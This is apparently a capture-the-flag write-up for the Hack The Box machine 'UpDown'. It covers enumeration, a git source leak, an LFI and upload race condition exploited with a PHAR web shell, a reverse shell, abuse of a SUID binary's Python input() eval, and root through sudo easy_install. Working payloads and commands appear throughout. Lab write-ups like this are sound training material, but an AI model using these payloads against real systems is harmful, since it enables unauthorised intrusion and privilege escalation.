**Date:** 2026-05-07

**Difficulty:** Medium

**OS:** Linux

**Tags:** #htb #ctf #medium #cve #LFI #Git #SUID #Python #Abuse

---

## 1. Initial Enumeration

### Nmap Scan

We begin by identifying open ports and services running on the target machine.


```Bash
┌──(kali㉿kali)-[~/Desktop]
└─$ sudo nmap -sV -O -sC 10.129.33.28      
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Is my Website up ?
```

### Web Directory Bruteforcing (Gobuster)

We perform directory enumeration to find hidden paths on the web server.



```Bash
┌──(kali㉿kali)-[~/Desktop]
└─$ sudo gobuster dir -u http://10.129.33.28 -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt 
dev                  (Status: 301) [--> http://10.129.33.28/dev/]
server-status        (Status: 403)
```

---

## 2. Web Analysis & Subdomain Fuzzing

### Initial Access Attempt

The website features a "Web Status Checker." We initially attempted various **Command Injection** payloads (URL encoding, different terminators) to gain RCE. However, the application returned alerts regarding injection attempts or simply failed to execute the commands.

![[UpDown1.png]] ![[UpDown2.png]] ![[UpDown3.png]] ![[UpDown4.png]] ![[UpDown5.png]]

### Subdomain Fuzzing (ffuf)

Since directory bruteforcing didn't yield immediate results, we fuzzed for subdomains and discovered `dev.siteisup.htb`.

```Bash
┌──(kali㉿kali)-[~/Desktop]
└─$ ffuf -u http://siteisup.htb -H "Host: FUZZ.siteisup.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 1131
dev                     [Status: 403, Size: 281]
```

![[UpDown6.png]]

Accessing `siteisup.htb/dev` directly resulted in a blank page. We re-enumerated the `/dev/` directory more aggressively.

### Specialized Directory Fuzzing

```Bash
┌──(kali㉿kali)-[~/Desktop]
└─$ sudo gobuster dir -u http://10.129.33.28/dev/ -w /usr/share/wordlists/dirb/common.txt 
.git/HEAD            (Status: 200) [Size: 21]
index.php            (Status: 200) [Size: 0]
```

![[UpDown8.png]]

---

## 3. Exploitation: Git Leaks & LFI

### Dumping the Git Repository

We discovered a `.git` directory, indicating a potential source code leak. We used `git-dumper` to reconstruct the repository.

```Bash
git-dumper http://siteisup.htb/dev/.git/ gitdump
```

The dump revealed several interesting files: `admin.php`, `checker.php`, `index.php`, and a `.htaccess` file.

### Source Code Review

The `.htaccess` file revealed that access to the `dev` subdomain requires a specific HTTP header:

```Apache
SetEnvIfNoCase Special-Dev "only4dev" Required-Header
Allow from env=Required-Header
```

`index.php` showed a **Local File Inclusion (LFI)** vulnerability where the `page` parameter is included with a `.php`extension appended:

```PHP
if($page && !preg_match("/bin|usr|home|var|etc/i",$page)){
        include($_GET['page'] . ".php");
}
```

### Accessing the Dev Subdomain

By modifying our request in Burp Suite to include `Special-Dev: only4dev`, we gained access to the developer site.

![[UpDown11.png]] ![[UpDown12.png]]

---

## 4. Foothold: Race Condition & Phar RCE

### Vulnerability Chain

1. **LFI in index.php:** Appends `.php` to input.
    
2. **Checker.php:** Allows file uploads but blacklists certain extensions (not `.phar` or `.txt`). It saves files as `uploads/md5(time())/filename`.
    
3. **Race Condition:** The script deletes the uploaded file _after_ checking the websites. If we provide an unroutable IP (e.g., `10.255.255.1`), `curl` hangs for 30 seconds, keeping our file on the server.
    

### Crafting the Payload

We created a PHAR exploit and renamed it to `.txt` to bypass filters.

```PHP
// build_phar.php
$phar = new Phar('exploit.phar');
$phar->startBuffering();
$phar->addFromString('shell.php', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();
```

We then uploaded it and used the `phar://` wrapper to trigger it via LFI:

`http://dev.siteisup.htb/?page=phar://uploads/<MD5_HASH>/exploit.txt/shell&cmd=id`

### Reverse Shell

We used a more robust PHP `proc_open` reverse shell script, zipped it, and uploaded it as `reverse.txt`.

```Bash
┌──(kali㉿kali)-[~/Desktop/htb/updown]
└─$ nc -lvnp 4445
connect to [10.10.15.190] from (UNKNOWN) [10.129.33.28] 59030
www-data@updown:/var/www/dev$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## 5. Lateral Movement to Developer

### SUID Binary Exploitation

We found a SUID binary in `/home/developer/dev/siteisup`.

```Bash
-rwsr-x--- 1 developer www-data  16928 Jun 22  2022 siteisup
-rwxr-x--- 1 developer www-data    154 Jun 22  2022 siteisup_test.py
```

`siteisup_test.py` uses the insecure `input()` function in Python 2, which acts like `eval()`.

```Python
url = input("Enter URL here:")
```

By executing the SUID binary and providing a Python exploit string, we gained a shell as `developer`.

```Bash
www-data@updown:/home/developer/dev$ ./siteisup
Enter URL here: __import__('os').system('/bin/bash')
id
uid=1002(developer) gid=33(www-data)
```

### Establishing Persistence

We retrieved the SSH private key from `/home/developer/.ssh/id_rsa` and logged in via SSH for a stable shell.

---

## 6. Privilege Escalation to Root

### Sudo Abuse (easy_install)

Checking sudo privileges revealed that `developer` can run `easy_install` as root.

```Bash
developer@updown:~$ sudo -l
(ALL) NOPASSWD: /usr/local/bin/easy_install
```

Following **GTFOBins**, we exploited `easy_install` by creating a malicious `setup.py` and "installing" the current directory.

```Bash
developer@updown:~$ echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > setup.py
developer@updown:~$ sudo /usr/local/bin/easy_install .
# id
uid=0(root) gid=0(root) groups=0(root)
```

**System Compromised.**
